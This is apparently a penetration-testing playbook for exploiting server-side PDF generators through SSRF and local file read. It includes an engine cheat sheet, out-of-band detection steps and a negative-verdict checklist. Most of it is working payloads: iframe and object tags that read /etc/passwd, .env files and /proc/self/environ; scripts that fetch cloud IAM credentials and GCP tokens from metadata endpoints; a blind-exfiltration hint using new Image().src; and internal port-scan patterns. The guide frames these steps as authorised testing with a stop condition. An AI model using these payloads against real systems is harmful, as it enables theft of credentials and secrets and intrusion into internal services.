# Server-Side PDF Generation SSRF/LFI — Vulnerability Skill

**Phase:** 3 | **Skill Type:** Testing | **Impact:** Critical | **Prerequisite:** Endpoint mapped (Phase 2), server-side PDF generation identified (invoice, receipt, report, ticket, export, render)

---

## Mental Model

"Generate PDF" endpoints are a goldmine because a PDF renderer is a **full browser/HTML engine running server-side** — one that developers treat as a dumb text converter. If the renderer accepts a URL, it's straight SSRF. If it accepts HTML, that HTML can load `file://`, `http://169.254.169.254`, `http://localhost`, or internal hostnames — and the resulting PDF *echoes the fetched content back to you in the rendered output*.

**The core assumption you're violating:** "Only the server's code decides what the PDF contains." In reality, the HTML/CSS/URL you submit becomes the PDF, and the fetch happens with the server's network position and credentials.

**Engine cheat sheet (identify it first — payloads differ):**

| Engine | Indicator | file:// read | JS enabled |
|--------|-----------|--------------|------------|
| **wkhtmltopdf** | Qt/WebKit errors, old rendering | ✅ via `<iframe src=file:///>` (unless `--disable-local-file-access`) | ✅ |
| **Headless Chrome/Puppeteer** | modern CSS, DevTools strings | ⚠️ `file://` blocked by default, but SSRF works | ✅ (use `fetch()` in JS) |
| **WeasyPrint** | no JS, Python errors | ⚠️ CSS `url()` can read files as resources | ❌ |
| **ReportLab/FPDF** | Python, limited HTML | ⚠️ URL params in `Image()`/`URL` | ❌ |
| **PrinceXML** | HTML+CSS, no JS by default | ✅ `<object data=file://>` | configurable |

**Impact ladder:** SSRF (external) → LFI/arbitrary file read (`file:///etc/passwd`) → internal port scan → cloud metadata (`169.254.169.254`) → RCE (rare, via wkhtmltopdf JS + internal services).

---

## Phase 1: OOB-First Detection (MANDATORY)

OOB confirms the renderer is fetching attacker-influenced resources — the fastest possible confirmation, works for both URL-to-PDF and HTML-to-PDF.

```bash
./tools/interactsh_launcher.sh start --output-dir engagement/oob/
OOB_URL=$(cat engagement/oob/oob_url.txt)
```

### 1.1 URL-to-PDF endpoint
```bash
curl -X POST https://target.com/pdf/generate -d "url=http://$OOB_URL/pdf-oob"
curl -X POST https://target.com/export/report -d "report_url=http://$OOB_URL/external"
```

### 1.2 HTML-to-PDF endpoint
```bash
curl -X POST https://target.com/invoice/generate \
  -H "Content-Type: application/json" \
  -d "{\"html\": \"<img src='http://$OOB_URL/img'/><iframe src='http://$OOB_URL/iframe'></iframe><link rel='stylesheet' href='http://$OOB_URL/style.css'>\"}"
```

### 1.3 CSS-only vector (WeasyPrint/PrinceXML — no JS)
```html
<style>body { background-image: url('http://OOB_URL/css'); }</style>
```

```bash
./tools/interactsh_launcher.sh poll --output-dir engagement/oob/ --timeout 60
```

Callback → the renderer fetched your resource. CONFIRMED fetch primitive. Skip to Phase 4.

---

## Phase 2: Confirmation

### 2.1 Local File Read (LFI)

**wkhtmltopdf** (reads file content into the PDF DOM):
```html
<iframe src="file:///etc/passwd"></iframe>
<iframe src="file:///etc/hostname"></iframe>
<link rel="stylesheet" href="file:///etc/passwd">     <!-- read-only, shows in source -->
<object data="file:///etc/passwd" type="text/plain"></object>
```

**PrinceXML:**
```html
<object data="file:///etc/passwd" type="text/plain"></object>
```

**WeasyPrint (CSS — exfiltrates resource metadata, less content):**
```css
body { background: url(file:///etc/passwd); }
```

Download the PDF and check its content/pages for `/etc/passwd` content. If `file://` is blocked, test the SSRF paths below.

### 2.2 Internal SSRF via HTML

```html
<img src="http://127.0.0.1:8080/">
<img src="http://localhost:3000/">
<iframe src="http://127.0.0.1:8080/"></iframe>
<script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(t=>document.body.innerText=t)</script>
```

Render the PDF — internal HTTP responses appear as pages/images/embedded content. Different ports → different page sizes/errors → port scan.

### 2.3 JavaScript RCE-adjacent (wkhtmltopdf / headless Chrome)

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", false);
  xhr.send();
  document.body.innerText = xhr.responseText;
</script>
```

For headless Chrome, `fetch()` with async/await inside the script, or use `new Image().src` for blind exfil.

### 2.4 Response Delineation

- `file://` read → clear text block in PDF (content confirmed)
- SSRF to internal service → embedded response or error page in PDF
- Filtered/blocked → PDF renders empty image/iframe area

---

## Phase 3: Negative Verdict (MANDATORY GATE)

**DO NOT declare negative without:**

1. Testing **both** input modes — URL-to-PDF AND HTML-to-PDF (many apps accept both)
2. Testing `img`, `iframe`, `link`, `object`, `embed`, CSS `url()`, and `<script>` fetch — one vector failing doesn't mean all fail
3. Testing `file://` and `http://` targets separately
4. Confirming OOB callbacks were attempted and polled long enough (renderers are async — wait 60s)
5. Testing internal loopback (`127.0.0.1`, `localhost`, `[::1]`) since external DNS may be blocked while internal is not
6. Checking the actual PDF bytes, not the HTTP response — the fetch may succeed but the content only appears inside the document
7. If `--disable-local-file-access`/sandbox blocks `file://` → verify SSRF is also blocked, not just LFI

If no callback, no file content, no internal content in the PDF → NEGATIVE.

---

## Phase 4: Exploitation

### 4.1 Cloud Metadata (highest impact)
```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<iframe src="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"></iframe>
```

### 4.2 Source Code / Config Read
```html
<iframe src="file:///var/www/html/app/config/database.php"></iframe>
<iframe src="file:///proc/self/environ"></iframe>
<iframe src="file:///var/www/html/app/.env"></iframe>
```

### 4.3 Internal Port Scan (one-hop, keep quiet)
Render a series of `<img src="http://127.0.0.1:PORT/">` — response/error differences across ports reveal live internal services. Then hit the interesting ones (`http://127.0.0.1:9200/` = Elasticsearch, `:3000` = internal dashboards).

**Stop condition:** First credential/secret/cloud-token extraction. Document and STOP — never pivot from the rendered PDF into production internals beyond proof.

---

## What You DO
- Identify the render engine first — payload syntax differs per engine
- Test OOB callbacks early (img/iframe/link/css/JS fetch) — fastest confirmation
- Test both URL-input and HTML-input modes
- Download and inspect the PDF bytes — the fetch evidence is *inside the document*
- Go for cloud metadata and config files first — highest impact, minimal noise

## What You DO NOT Do
- Declare negative because `file://` failed — SSRF via `http://127.0.0.1` is still a critical finding
- Assume the HTTP response reflects the fetch — blind SSRF is common here; the PDF is the oracle
- Ignore the engine — sending wkhtmltopdf `iframe` payloads to a WeasyPrint backend wastes cycles (and vice versa)
- Scan large internal ranges — prove one internal service, then stop
- Skip the OOB poll wait — PDF renderers fetch asynchronously

---

## Cross-Skill Links
- [[ssrf]] — Core SSRF methodology; this skill is the PDF-specific wrapper
- [[path-traversal]] — LFI through the renderer reads server files
- [[xss]] — wkhtmltopdf + JS ≈ stored XSS into an admin who views the PDF
- [[file-upload]] — Some apps accept the HTML *as an upload*; same payloads apply
